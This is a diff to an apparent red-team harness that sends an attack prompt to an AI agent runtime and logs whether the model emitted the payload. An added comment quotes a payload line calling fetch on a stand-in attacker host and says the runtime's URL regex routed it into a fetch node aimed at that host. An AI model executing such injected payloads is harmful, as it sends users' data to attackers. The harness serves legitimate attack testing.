@@ -103,6 +103,14 @@ async def main() -> int:
         "prompt": ATTACK,
         "run_id": result["run_id"],
         "status": result["status"],
+        # The graph matters here as much as the surface. The first version of
+        # this attack never reached the composer at all: the payload's own
+        # "fetch('https://attacker.example/...')" matched the runtime's URL
+        # intent regex, so the frontier became a fetch_url node aimed at the
+        # attacker's host. Recording which nodes ran makes that class of
+        # failure visible instead of looking like an empty interface.
+        "graph": {nid: {"skill": n["skill"], "state": n["state"]}
+                  for nid, n in snapshot.nodes.items()},
         "provider": node_result.get("provider"),
         "model": node_result.get("model"),
         "model_attempted_any_payload": any(model_emitted.values()),
